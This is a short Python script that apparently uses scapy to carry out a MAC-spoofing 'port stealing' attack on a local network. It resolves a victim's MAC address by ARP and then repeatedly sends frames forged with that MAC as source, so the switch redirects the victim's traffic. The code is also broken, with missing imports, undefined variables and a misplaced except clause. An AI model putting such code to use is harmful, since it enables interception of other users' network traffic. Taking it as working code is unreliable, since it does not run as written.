#!/usr/bin/env python
from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp

mac_attack = "XX:XX:XX:XX:XX:XX"
mac_victim = "XX:XX:XX:XX:XX:XX"
ip_victim = "X.X.X.X"

def get_mac_from_ip(ip):
    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
    mac = srp(arp_packet, timeout=2, verbose=False, iface='eth1')[0][0][1].hwsrc
    return mac

def stealing(ip_victim, mac_victim):
    packet  = Ether(src = mac_victim)/IP(dst=ip_victim)
    sendp(packet, iface='eth1')

def main():
    if mac_victim == "XX:XX:XX:XX:XX:XX":
        target_ip = input("target IP :")
        try:
            mac_victim = get_mac_from_ip(target_ip)
            print("target MAC", mac_victim)
        except:
            print("No MAC found for target")
            quit()
    try:
        while True:        
            print("Sending packet from : ", mac_attack, " to : ", mac_victim)
            stealing(target_ip,mac_victim)
            time.sleep(1)
        except KeyboardInterrupt:
            quit()
            
if __name__ == '__main__':
    main()
